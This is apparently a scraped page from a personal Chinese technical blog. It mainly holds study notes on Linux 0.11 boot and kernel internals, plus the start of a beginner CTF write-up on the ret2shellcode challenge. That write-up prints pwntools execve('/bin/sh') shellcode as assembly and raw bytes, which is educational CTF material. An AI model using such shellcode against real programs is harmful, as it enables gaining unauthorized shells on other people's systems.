+12345678910111213141516171819202122232425262728293031323334353637383940414243;移位entry start start: 					;内存中0x07C00对应的就是这里	mov	ax,#BOOTSEG  ;0x07C00	mov	ds,ax	mov	ax,#INITSEG  ;0x9000	mov	es,ax        ;进行复制,挪位置,把0x07c00 挪到0x9000	mov	cx,#256	sub	si,si	sub	di,di	rep	movw        ;移动一个字 两个字节  512 /2 -256次	jmpi	go,INITSEG ; 跳到新的位置,;加载setup.s的四个扇区load_setup: ; 加载4个扇区	mov	dx,#0x0000		! drive 0, head 0	mov	cx,#0x0002		! sector 2, track 0	mov	bx,#0x0200		! address = 512, in INITSEG	mov	ax,#0x0200+SETUPLEN	! service 2, nr of sectors	int	0x13			! read it  bios的中断,读取磁盘	jnc	ok_load_setup		! ok - continue	mov	dx,#0x0000	mov	ax,#0x0000		! reset the diskette	int	0x13	j	load_setup;加载head和剩余的操作系统ok_load_setup:! 把从硬盘第 6 个扇区开始往后的 240 个扇区，加载到内存 0x10000 处	mov	ax,#SYSSEG。;0x1000	mov	es,ax		! segment of 0x010000	call	read_it	call	kill_motor	seg cs	mov	ax,root_dev	cmp	ax,#0	jne	root_defined;跳转到setup.sroot_defined:	seg cs	mov	root_dev,ax	jmpi	0,SETUPSEG; 0x9020 跳转到setup.s开始继续执行了!!!
+
+setup.s和head.s的衔接1.setup.s把head.s及之后的代码都移动到了内存0开始的地方(do_move)
+2.设置gdt、ldt(end_move)
+3.开保护模式, jmpi 0,8 跳转到了head.s
+123mov	ax,#0x0001	! protected mode (PE) bit。 保护模式. PE,不是任何人都可以修改lmsw	ax		! This is it!jmpi	0,8		! jmp offset 0 of segment 8 (cs)  gdt的1项, 0开始编号,第二项
+
+5.setup程序的最后是jmpi 0,8 ，为什么这个8不能简单的当作阿拉伯数字8看待，究竟有什么内涵？p25
+https://mp.weixin.qq.com/s/S5zarr9BmLhUHAmdmeNypA
+123mov ax,#0x0001  ; protected mode (PE) bitlmsw ax      ; This is it;jmpi	0,8	! jmp offset 0 of segment 8 (cs) gdt的1项, 0开始编号,第二项
+
+在执行这条指令前已经转变为了保护模式, 保护模式的寻址方式变了,需要通过段选择子,段寄存器中存储的不再是地址,而是段选择子
+0 表示段内偏移地址, 8代表cs(代码段)的值, 更具体而言,8是 0000,0000,0000,1000
+根据下图段选择子的结构可以看出,1是代表了描述符索引,即gdt表的第一项,也就是现在地址的0!
+gdt表在此之前已经初始化过,第一项是内核代码段,base address &#x3D; 0 , 偏移地址也是0,所以跳转到内存的0地址
+
+
+123456789101112gdt:    .word   0,0,0,0     ; dummy    .word   0x07FF      ; 8Mb - limit=2047 (2048*4096=8Mb)    .word   0x0000      ; base address=0    .word   0x9A00      ; code read/exec    .word   0x00C0      ; granularity=4096, 386    .word   0x07FF      ; 8Mb - limit=2047 (2048*4096=8Mb)    .word   0x0000      ; base address=0    .word   0x9200      ; data read/write    .word   0x00C0      ; granularity=4096, 386
+
+6.保护模式在“保护”什么？它的“保护”体现在哪里？特权级的目的和意义是什么？分页有“保护”作用吗？p438
+保护模式在保护段,通过段机制划分不同的段,设置各个段的访问权限. 增加了段限长,防止了对代码段的覆盖以及超越权限的访问
+特权级的目的是 阻止非法的访问, 对用户进程之间进行了隔离
+意义是保护了资源
+分页有保护作用,分页使得用户无法直接找到物理地址,用户只能操作逻辑地址,而逻辑地址需要先转化为线性地址,然后才能进一步转化为物理地址
+7.在setup程序里曾经设置过gdt，为什么在head程序中将其废弃，又重新设置了一个？为什么设置两次，而不是一次搞好？p33
+因为第一次设置GDT是在setup.s里面设置的数据,setup.s将来会在设计缓冲区时被覆盖,所以需要改变位置. 其实这是设计者精心打磨内存使用空间而产生的后果,尽可能不浪费一点空间,head.s执行时,gdt又被写到了head.s执行过的程序中,实现了内存的充分利用.
+8.进程0的task_struct在哪？具体内容是什么？在哪?include&#x2F;linux&#x2F;sched.h 是写死的,在INIT_ TASK里,运行时位于内核数据区
+在未初始化进程0之前,使用的是boot阶段的内核栈(user_stack) 很奇怪吧,内核栈却叫user_stack,p34
+具体内容?包含了进程各项初始化的内容,具体的话可以看task_struct,附在下面了. (include&#x2F;linux&#x2F;sched.h )
+如:进程0的进程状态,LDT,TSS等 p68
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758/* *  INIT_TASK is used to set up the first task table, touch at * your own risk!. Base=0, limit=0x9ffff (=640kB) */         // 下面的就是进程0的各个参数的具体值#define INIT_TASK \/* state etc */	&#123; 0,15,15, \   // 0是说可以跑,而不是正在跑 /* signals */	0,&#123;&#123;&#125;,&#125;,0, \/* ec,brk... */	0,0,0,0,0,0, \/* pid etc.. */	0,-1,0,0,0, \/* uid etc */	0,0,0,0,0,0, \/* alarm */	0,0,0,0,0,0, \/* math */	0, \/* fs info */	-1,0022,NULL,NULL,NULL,0, \/* filp */	&#123;NULL,&#125;, \	&#123; \		&#123;0,0&#125;, \/* ldt */	&#123;0x9f,0xc0fa00&#125;, \		&#123;0x9f,0xc0f200&#125;, \	&#125;, \/*tss*/	&#123;0,PAGE_SIZE+(long)&amp;init_task,0x10,0,0,0,0,(long)&amp;pg_dir,\	 0,0,0,0,0,0,0,0, \	 0,0,0x17,0x17,0x17,0x17,0x17,0x17, \	 _LDT(0),0x80000000, \		&#123;&#125; \	&#125;, \&#125;struct task_struct &#123;          // 非常非常非常重要,操作系统里最核心的东西/* these are hardcoded - don&#x27;t touch */	long state;	/* -1 unrunnable, 0 runnable, &gt;0 stopped */ //状态	long counter;  //时间片 	long priority;	long signal;	struct sigaction sigaction[32];	long blocked;	/* bitmap of masked signals *//* various fields */	int exit_code;	unsigned long start_code,end_code,end_data,brk,start_stack;  //malloc从这里划	long pid,father,pgrp,session,leader;	unsigned short uid,euid,suid;	unsigned short gid,egid,sgid;	long alarm;	long utime,stime,cutime,cstime,start_time;	unsigned short used_math;/* file system info */	int tty;		/* -1 if no tty, so it must be signed */	unsigned short umask;	struct m_inode * pwd;	struct m_inode * root;	struct m_inode * executable;	unsigned long close_on_exec;	struct file * filp[NR_OPEN];/* ldt for this task 0 - zero 1 - cs 2 - ds&amp;ss */	struct desc_struct ldt[3];/* tss for this task */	struct tss_struct tss;&#125;;
+
+9.内核的线性地址空间是如何分页的？画出从0x000000开始的7个页（包括页目录表、页表所在页）的挂接关系图，就是页目录表的前四个页目录项、第一个页表的前7个页表项指向什么位置？给出代码证据。p37 
+赵炯p438
+注意是线性地址空间,线性地址空间远大于物理地址空间,线性地址空间是 64k * 64k &#x3D; 4G。 0xFFFFFF 2的32次方
+分页4k大小为一页
+setup_paging开始
+第一页是页目录表,随后的4个页表是内核专属的页表
+分别代表什么呢? 第一个是不是gdt?? gdt在哪??
+12345678910111213141516171819202122232425head.s.align 2setup_paging:	movl $1024*5,%ecx		/* 5 pages - pg_dir+4 page tables */	xorl %eax,%eax	xorl %edi,%edi			/* pg_dir is at 0x000 */	cld;rep;stosl	movl $pg0+7,_pg_dir		/* set present bit/user r/w  111 */   ;111 已分页  三特权? 可读写	movl $pg1+7,_pg_dir+4		/*  --------- &quot; &quot; ---------				 */	movl $pg2+7,_pg_dir+8		/*  --------- &quot; &quot; --------- */	movl $pg3+7,_pg_dir+12		/*  --------- &quot; &quot; --------- */	movl $pg3+4092,%edi	movl $0xfff007,%eax		/*  16Mb - 4096 + 7 (r/w user,p) */	std1:	stosl			/* fill pages backwards - more efficient :-) */	subl $0x1000,%eax	jge 1b	xorl %eax,%eax		/* pg_dir is at 0x0000 */	movl %eax,%cr3		/* cr3 - page directory start 恒等映射 物理 = 线性*/	movl %cr0,%eax	orl $0x80000000,%eax /*打开分页*/	movl %eax,%cr0		/* set paging (PG) bit */	ret			/* this also flushes prefetch-queue */				 ; 切换到main函数
+
+页目录表、页表、页一个页目录表项是4byte,也就是32位,通过它来寻址一个页表, 页目录表一共4* 1024 &#x3D; 4k大小
+一个页表也是4byte,每一个页表有1024个页表项,也是 4k 占用一页
+
+开始的前7个页是什么意思呢?p39
+也就是前7个4k, 第一个4k是页目录表,第2~7个4k是第一个页表的
+赵炯p78
+
+挂接关系图p39
+10.在head程序执行结束的时候，在idt的前面有184个字节的head程序的剩余代码，剩余了什么？为什么要剩余？11.为什么不用call，而是用ret“调用”main函数？画出调用路线图，给出代码证据。https://mp.weixin.qq.com/s/ISyaX5zPWRw_d-9zvZUPUg
+因为main函数是整个系统的运行函数,它不能被call,没有比它等级更高的,call的话是需要返回的,main不需要返回,main结束了,就关机了(
+正常函数调用是会把eip(被掉函数返回时 返回的地址) 进行压栈, ret的时候取出来,进入到这里继续执行,main不能被调用,但可以伪造被调用的假象,然后也进行ret,就可以进入到main里了
+调用路线图 p42正常的call
+
+模仿的call
+
+代码head.s123456789101112131415startup_32:	jmp after_page_tablesafter_page_tables:	pushl $0		# These are the parameters to main :-)	pushl $0	pushl $0	pushl $L6		# return address for main, if it decides to.	pushl $_main    ; 后面把这个pop出来	jmp setup_pagingsetup_paging:    ...    ret ;回到main函数
+
+
+12.用文字和图说明中断描述符表是如何初始化的，可以举例说明（比如：set_trap_gate(0,&amp;divide_error)），并给出代码证据。p53页
+&#x2F;init&#x2F;main.c trap_init();
+&#x2F;kernel&#x2F;trap.c  trap_init()
+&#x2F;include&#x2F;asm&#x2F;system.h 
+1234567891011121314151617181920//设置中断门函数#define set_intr_gate(n,addr) \  // n 中断号 addr 中断程序偏移地址	_set_gate(&amp;idt[n],14,0,addr)  //&amp;idt[n]对应中断号在中断描述符表中的偏移值；中断描述符的类型是 14，特权级是 0。//设置陷阱门函数#define set_trap_gate(n,addr) \	_set_gate(&amp;idt[n],15,0,addr) // idt表的n项,f,0, 0对应dpl,15对应type ,以二进制来看到//设置系统调用门函数#define set_system_gate(n,addr) \	_set_gate(&amp;idt[n],15,3,addr)#define _set_gate(gate_addr,type,dpl,addr) \__asm__ (&quot;movw %%dx,%%ax\n\t&quot; \ //实现了偏移的拆分	&quot;movw %0,%%dx\n\t&quot; \        //将偏移的低字给dx	&quot;movl %%eax,%1\n\t&quot; \         	&quot;movl %%edx,%2&quot; \            //差四字节	: \	: &quot;i&quot; ((short) (0x8000+(dpl&lt;&lt;13)+(type&lt;&lt;8))), \	&quot;o&quot; (*((char *) (gate_addr))), \	&quot;o&quot; (*(4+(char *) (gate_addr))), \	&quot;d&quot; ((char *) (addr)),&quot;a&quot; (0x00080000))  // jump 08》???
+
+13.在IA-32中，有大约20多个指令是只能在0特权级下使用，其他的指令，比如cli，并没有这个约定。奇怪的是，在Linux0.11中，3特权级的进程代码并不能使用cli指令，这是为什么？请解释并给出代码证据。原因解释:    这个东西和特权级有关(废话),这个是intel的规定,cli和sti与CPL和EFLAGS[IOPL]相关,通过EFLAGS中的IOOPL来保护一些敏感io指令,如cli、sti、in、out等,只有当CPL≤IOPL时才能执行,也就是说当前特权级大于IOPL设置的特权级才可以执行、否则会产生一个一般性保护异常
+
+    IOPL位于EFLAGS的12-13位,只能通过iret改变,linux0.11的0进程,INIT_TASK中IOPL为0,在move_to_user_mode中执行了pushfl\n\t,继承了内核的EFLAGS,所以用户态的3特权级大于IOPL的0特权级,无法调用cli
+
+代码:move_to_user_mode1234567#define move_to_user_mode() \__asm__ (&quot;movl %%esp,%%eax\n\t&quot; \	&quot;pushfl\n\t&quot; \....	&quot;iret\n&quot; \ ....	:::&quot;ax&quot;)
+
+INIT_TASK include&#x2F;linux&#x2F;sched.htss的第10位为0,可以在该文件下找到tss的结构,第10位就是eflags
+123456789101112131415161718192021222324252627282930313233343536#define INIT_TASK \.../*tss*/	&#123;0,PAGE_SIZE+(long)&amp;init_task,0x10,0,0,0,0,(long)&amp;pg_dir,\	 0,0,0,0,0,0,0,0, \	 0,0,0x17,0x17,0x17,0x17,0x17,0x17, \	 _LDT(0),0x80000000, \		&#123;&#125; \	&#125;, \&#125;struct tss_struct &#123;	long	back_link;	/* 16 high bits zero */	long	esp0;	long	ss0;		/* 16 high bits zero */	long	esp1;	long	ss1;		/* 16 high bits zero */	long	esp2;	long	ss2;		/* 16 high bits zero */	long	cr3;	long	eip;	long	eflags;	long	eax,ecx,edx,ebx;	long	esp;	long	ebp;	long	esi;	long	edi;	long	es;		/* 16 high bits zero */	long	cs;		/* 16 high bits zero */	long	ss;		/* 16 high bits zero */	long	ds;		/* 16 high bits zero */	long	fs;		/* 16 high bits zero */	long	gs;		/* 16 high bits zero */	long	ldt;		/* 16 high bits zero */	long	trace_bitmap;	/* bits: trace 0, bitmap 16-31 */	struct i387_struct i387;&#125;;
+
+14.进程0的task_struct在哪？具体内容是什么？给出代码证据。init&#x2F;main.c sched_init();
+kernel&#x2F;sched.c 
+12345678910111213void sched_init(void) //调度程序的初始化子程序 &#123;	int i;	struct desc_struct * p;	if (sizeof(struct sigaction) != 16)		panic(&quot;Struct sigaction MUST be 16 bytes&quot;);  //致命错误	set_tss_desc(gdt+FIRST_TSS_ENTRY,&amp;(init_task.task.tss)); // 设置初始任务（任务 0）的任务状态段描述符和局部数据表描述符(include/asm/system.h,65)。	set_ldt_desc(gdt+FIRST_LDT_ENTRY,&amp;(init_task.task.ldt));init_taskstatic union task_union init_task = &#123;INIT_TASK,&#125;; // 这里进行类型转换
+
+15.在system.h里读懂代码。这里中断门、陷阱门、系统调用都是通过_set_gate设置的，用的是同一个嵌入汇编代码，比较明显的差别是dpl一个是3，另外两个是0，这是为什么？说明理由。p51
+12345678910111213141516171819#define _set_gate(gate_addr,type,dpl,addr) \__asm__ (&quot;movw %%dx,%%ax\n\t&quot; \ //实现了偏移的拆分	&quot;movw %0,%%dx\n\t&quot; \        //将偏移的低字给dx	&quot;movl %%eax,%1\n\t&quot; \         	&quot;movl %%edx,%2&quot; \            //差四字节	: \	: &quot;i&quot; ((short) (0x8000+(dpl&lt;&lt;13)+(type&lt;&lt;8))), \	&quot;o&quot; (*((char *) (gate_addr))), \	&quot;o&quot; (*(4+(char *) (gate_addr))), \	&quot;d&quot; ((char *) (addr)),&quot;a&quot; (0x00080000))  // jump 08》???//设置中断门函数#define set_intr_gate(n,addr) \  // n 中断号 addr 中断程序偏移地址	_set_gate(&amp;idt[n],14,0,addr)  //&amp;idt[n]对应中断号在中断描述符表中的偏移值；中断描述符的类型是 14，特权级是 0。//设置陷阱门函数#define set_trap_gate(n,addr) \	_set_gate(&amp;idt[n],15,0,addr) // idt表的n项,f,0, 0对应dpl,15对应type ,以二进制来看到//设置系统调用门函数#define set_system_gate(n,addr) \	_set_gate(&amp;idt[n],15,3,addr)
+
+这里也是特权级保护的思想, 大概申请者用于大于该东西的特权级才能访问(具体的比这个复杂, 参加IA32 第三卷)
+set_system_gate是3,意思是系统调用可以由3特权级(即用户特权级)进行调用,其余两个为0的意思是只能由内核处理,禁止用户进程进行调用,这样就起到了保护系统的作用
+16.进程0 fork进程1之前，为什么先调用move_to_user_mode()？用的是什么方法？解释其中的道理。p78 
+为什么要调用move_to_user_mode()?    因为Linux操作系统规定,除了进程0之外,所有进程都要由一个已有进程在3特权级下进行创建,所以进程0在fork进程1之前,要先从0特权级翻转到3特权级
+
+Linux0.11是通过move_to_user_mode(),模仿中断返回动作,实现从0特权级转变为3特权级  
+方法(怎么实现翻转呢?    IA32体系结构翻转特权级的方法之一是中断,进入中断的时候由3转0,返回的时候由0转3. int指令会引发CPU硬件完成SS、ESP、EFLAGS、CS、EIP的值按顺序进栈,返回时CPU执行iret指令会将栈中的值自动按反序恢复给这五个寄存器
+
+    既然要模拟中断返回,那么就需要模拟int(中断)时的压栈,就是前面5个push,最后调用iret进行返回,将SS,ESP,EFLAGS,CS,EIP按顺序交给CPU,CPU此时就翻转到了3特权级(具体的呢??)
+
+代码include&#x2F;asm&#x2F;system.h
+1234567891011121314#define move_to_user_mode() \__asm__ (&quot;movl %%esp,%%eax\n\t&quot; \	&quot;pushl $0x17\n\t&quot; \  //SS 0x17 =  10(第三项)1(ldt)11(特权级3 )  代替inc int? 这是个段值,用户程序数据段   由0特权变为3特权 	&quot;pushl %%eax\n\t&quot; \ //里面就是esp    对的,看第一句	&quot;pushfl\n\t&quot; \	&quot;pushl $0x0f\n\t&quot; \ // 0000000000001111 最后两位11(特权级3)	&quot;pushl $1f\n\t&quot; \ 	&quot;iret\n&quot; \ // 中断返回 (与中断不配套其实,单独出现的一个返回,前面是一个模拟中断)	&quot;1:\tmovl $0x17,%%eax\n\t&quot; \   //开始3特权级  切3态的话  为什么说切到task0了? ldtr tr-&gt;	&quot;movw %%ax,%%ds\n\t&quot; \         // 进程0代码      分页的时候 + 7、 task数组,都可以说明是进程0	&quot;movw %%ax,%%es\n\t&quot; \	&quot;movw %%ax,%%fs\n\t&quot; \	&quot;movw %%ax,%%gs&quot; \	:::&quot;ax&quot;)
+
+17.在Linux操作系统中大量使用了中断、异常类的处理，究竟有什么好处？    在此之前是采用“主动轮巡”的方式来处理这些请求,在轮巡的时候干不了别的,很浪费时间. 所以不如采用被动的模式,即当有需要的时候,发送中断信号,告诉CPU进入到具体的中断处理程序进行处理. 这样使得CPU的处理更加高效.
+
+18.copy_process函数的参数最后五项是：long eip,long cs,long eflags,long esp,long ss。查看栈结构确实有这五个参数，奇怪的是其他参数的压栈代码都能找得到，确找不到这五个参数的压栈代码，反汇编代码中也查不到，请解释原因。p83
+是在int 0x80的时候,CPU硬件自动将ss、esp、eflags、cs、eip进行压栈(压入进程0的内核栈), (本意是保护存储压栈现场,使得中断返回后能够继续正常执行,在这里我们灵活取用了)
+init&#x2F;main.c 
+19.分析get_free_page()函数的代码，叙述在主内存中获取一个空闲页的技术路线。p89
+赵炯p446
+kernel&#x2F;fork.c
+1234567891011int copy_process(int nr,long ebp,long edi,long esi,long gs,long none, //none是		long ebx,long ecx,long edx,		long fs,long es,long ds,		long eip,long cs,long eflags,long esp,long ss) //int 0x80 ss esp啥呀这是&#123; //参数哪来的呢?? 传参了吗? 压栈放在栈里了, 主调函数往里放 在哪传的?	struct task_struct *p; 	int i;	struct file *f;	p = (struct task_struct *) get_free_page(); //返回的指针做强制类型转换,把一块空间转换成一个struct	if (!p)
+
+mm&#x2F;memory.c
+12345678910111213141516171819202122232425/* * Get physical address of first (actually last :-) free page, and mark it * used. If no free pages left, return 0. */unsigned long get_free_page(void)&#123;register unsigned long __res asm(&quot;ax&quot;);__asm__(&quot;std ; repne ; scasb\n\t&quot;	&quot;jne 1f\n\t&quot;	&quot;movb $1,1(%%edi)\n\t&quot;	&quot;sall $12,%%ecx\n\t&quot;	&quot;addl %2,%%ecx\n\t&quot;	&quot;movl %%ecx,%%edx\n\t&quot;	&quot;movl $1024,%%ecx\n\t&quot;	&quot;leal 4092(%%edx),%%edi\n\t&quot;	&quot;rep ; stosl\n\t&quot;	&quot;movl %%edx,%%eax\n&quot;	&quot;1:&quot;	:&quot;=a&quot; (__res)	:&quot;0&quot; (0),&quot;i&quot; (LOW_MEM),&quot;c&quot; (PAGING_PAGES),	&quot;D&quot; (mem_map+PAGING_PAGES-1)	:&quot;di&quot;,&quot;cx&quot;,&quot;dx&quot;);return __res;&#125;
+
+20.分析copy_page_tables（）函数的代码，叙述父进程如何为子进程复制页表。p97
+参考资料《Linux内核设计的艺术 第二版》 新设计团队
+《Linux内核完全注释》 赵炯
+《IA32》 手册 第三卷
+https://www.likecs.com/show-204742912.html
+https://github.com/sunym1993/flash-linux0.11-talk
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-2-ret2shellcode/" title="pwn入门-2-ret2shellcode">pwn入门-2-ret2shellcode</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-13T13:12:12.000Z" title="发表于 2022-10-13 21:12:12">2022-10-13</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-18T11:41:15.912Z" title="更新于 2023-02-18 19:41:15">2023-02-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">ctfwiki的例子bamboofox 中的 ret2shellcode:
+需要有可读可写可执行的段,将shellcode写入这里,然后执行shellcode
+这道题其实是给的一种很简单的方法,直接把shellcode写入了bss段,然后这个段是可读可写可执行的
+123456.bss:0804A065                 align 20h.bss:0804A080                 public buf2.bss:0804A080 ; char buf2[100].bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o.bss:0804A080 _bss            ends.bss:0804A080
+
+
+
+
+
+查看各个段的属性方法一:在gdb中调试,启动程序后用vmmap
+.bss:0804A080  对应着 0x804a000 0x804b000 0x001000 rwx &#x2F;home&#x2F;ubuntu&#x2F;shellcode&#x2F;ret2shellcode
+可读可写可执行
+123456789101112131415161718gef➤  vmmap[ Legend:  Code | Heap | Stack ]Start      End        Offset     Perm Path0x8048000 0x8049000 0x000000 r-x /home/ubuntu/shellcode/ret2shellcode0x8049000 0x804a000 0x000000 r-x /home/ubuntu/shellcode/ret2shellcode0x804a000 0x804b000 0x001000 rwx /home/ubuntu/shellcode/ret2shellcode0xf7de5000 0xf7fba000 0x000000 r-x /lib/i386-linux-gnu/libc-2.27.so0xf7fba000 0xf7fbb000 0x1d5000 --- /lib/i386-linux-gnu/libc-2.27.so0xf7fbb000 0xf7fbd000 0x1d5000 r-x /lib/i386-linux-gnu/libc-2.27.so0xf7fbd000 0xf7fbe000 0x1d7000 rwx /lib/i386-linux-gnu/libc-2.27.so0xf7fbe000 0xf7fc1000 0x000000 rwx0xf7fd0000 0xf7fd2000 0x000000 rwx0xf7fd2000 0xf7fd5000 0x000000 r-- [vvar]0xf7fd5000 0xf7fd6000 0x000000 r-x [vdso]0xf7fd6000 0xf7ffc000 0x000000 r-x /lib/i386-linux-gnu/ld-2.27.so0xf7ffc000 0xf7ffd000 0x025000 r-x /lib/i386-linux-gnu/ld-2.27.so0xf7ffd000 0xf7ffe000 0x026000 rwx /lib/i386-linux-gnu/ld-2.27.so0xfffdd000 0xffffe000 0x000000 rwx [stack]
+
+
+
+方法二:readelf
+pwntools中的shellcode相关函数shellcraft.sh() 汇编代码的shellcode
+asm(shellcraft.sh())  二进制机器码(16进制)的shellcode
+123456789101112131415161718192021222324252627shellcraft.sh()/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */    /* push b&#x27;/bin///sh\x00&#x27; */    push 0x68    push 0x732f2f2f    push 0x6e69622f    mov ebx, esp    /* push argument array [&#x27;sh\x00&#x27;] */    /* push &#x27;sh\x00\x00&#x27; */    push 0x1010101    xor dword ptr [esp], 0x1016972    xor ecx, ecx    push ecx /* null terminate */    push 4    pop ecx    add ecx, esp    push ecx /* &#x27;sh\x00&#x27; */    mov ecx, esp    xor edx, edx    /* call execve() */    push SYS_execve /* 0xb */    pop eax    int 0x80asm(shellcraft.sh()) b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;
+
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/" title="pwn入门-1-初识">pwn入门-1-初识</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-11T08:49:11.000Z" title="发表于 2022-10-11 16:49:11">2022-10-11</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-18T11:41:11.064Z" title="更新于 2023-02-18 19:41:11">2023-02-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​	学pwn有一段时间了,反反复复捣鼓一些东西,还是觉得以博客记录比较好,梳理自己的思路,会以第一人称来写,来记录学习的过程和结局思路(不是那种我是老师,教你学, 而是自己在探索.所以可能有时候会比较傻) 基础知识总有书和博客比我写得好,我觉得没有必要造轮子,所以有些基础知识可能会不会写的太细….反之,有一些博客上漏掉的细节,以及解题的关键会重点写(不会吧不会吧,真有人看你博客吗)
 ​	自己曾经说网上99%的博客都是垃圾(包括自己的),希望自己换了新博客后写的能质量高一点(至少越来越有长进)。(笑,不会真有人看你博客吧?)
 ​	第一篇文章首先来简单说一下自己目前认知的pwn
 什么是pwn?​	简单来说就是二进制漏洞的利用,什么是二进制呢? 这里的二进制指的是二进制程序,也就是我们平常用高级语言编写的程序被编译链接后成为的01010101, 它们在操作系统中运行的时候,会因为操作系统和cpu等设计的问题,以及程序员的问题,出现各种bug,导致漏洞利用.
@@ -237,7 +719,7 @@ More info: Generating
 Deploy to remote sites1$ hexo deploy
 
 More info: Deployment
-</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/8/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/#content-inner">8</a><span class="page-number current">9</span></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">唐仔橙</div><div class="author-info__description">喜欢探索世界,在读研究生,计算机爱好者的成长记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">83</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tangzichengcc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">会记录自己的学习经历,以及一些经历,如果有想法或者疑惑,欢迎交流!!</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-50-iofile%E4%B8%BB%E8%A6%81%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/" title="pwn入门-50-iofile主要函数分析"><img src="/img/background/14.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-50-iofile主要函数分析"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-50-iofile%E4%B8%BB%E8%A6%81%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/" title="pwn入门-50-iofile主要函数分析">pwn入门-50-iofile主要函数分析</a><time datetime="2024-02-06T06:24:14.000Z" title="发表于 2024-02-06 14:24:14">2024-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/" title="pwn入门-49-pwnable之seethefile"><img src="/img/background/6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-49-pwnable之seethefile"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/" title="pwn入门-49-pwnable之seethefile">pwn入门-49-pwnable之seethefile</a><time datetime="2024-01-28T14:31:00.000Z" title="发表于 2024-01-28 22:31:00">2024-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/" title="pwn入门-48-setcontext应用"><img src="/img/background/3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-48-setcontext应用"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/" title="pwn入门-48-setcontext应用">pwn入门-48-setcontext应用</a><time datetime="2024-01-27T15:28:41.000Z" title="发表于 2024-01-27 23:28:41">2024-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwn入门-47-zh3R0CTF2021-moreprintf"><img src="/img/background/15.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-47-zh3R0CTF2021-moreprintf"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwn入门-47-zh3R0CTF2021-moreprintf">pwn入门-47-zh3R0CTF2021-moreprintf</a><time datetime="2023-11-12T15:40:29.000Z" title="发表于 2023-11-12 23:40:29">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="c语言回炉重造-unix系统接口"><img src="/img/background/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="c语言回炉重造-unix系统接口"/></a><div class="content"><a class="title" 